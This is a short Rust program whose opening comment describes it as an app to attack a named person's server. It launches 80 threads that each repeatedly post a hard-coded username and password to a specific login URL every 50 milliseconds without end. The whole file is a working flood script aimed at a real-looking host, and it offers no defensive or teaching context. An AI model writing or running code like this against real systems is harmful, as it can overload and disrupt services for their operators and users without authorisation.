// app to attack simon's server


use curl::easy::{Easy, List};
use std::{thread, time::Duration};

fn attack() -> usize {
    let mut easy = Easy::new();
    let url = "https://boardgamemanagement.vincentvibe3.com/login"; // test endpoint
    easy.url(url).unwrap();
    easy.post(true).unwrap();

    // JSON payload
    let json_payload = r#"{"username": "simon", "password": "youcooked"}"#;
    easy.post_fields_copy(json_payload.as_bytes()).unwrap();

    // Set the Content-Type header
    let mut headers = List::new();
    headers.append("Content-Type: application/json").unwrap();
    easy.http_headers(headers).unwrap();

    loop {
        let mut response_data = Vec::new();
        {
            let mut transfer = easy.transfer();
            transfer
                .write_function(|data| {
                    response_data.extend_from_slice(data);
                    Ok(data.len())
                })
                .unwrap();
            transfer.perform().unwrap();
        }

        println!("Response: {}", String::from_utf8_lossy(&response_data));
        thread::sleep(Duration::from_millis(50));
    }
}


fn main() {
    let mut handles = vec![];

    for _ in 0..80 {
        let handle = thread::spawn(|| {
            attack();
        });
        handles.push(handle);
    }
    for handle in handles {
        handle.join().unwrap();
    }
}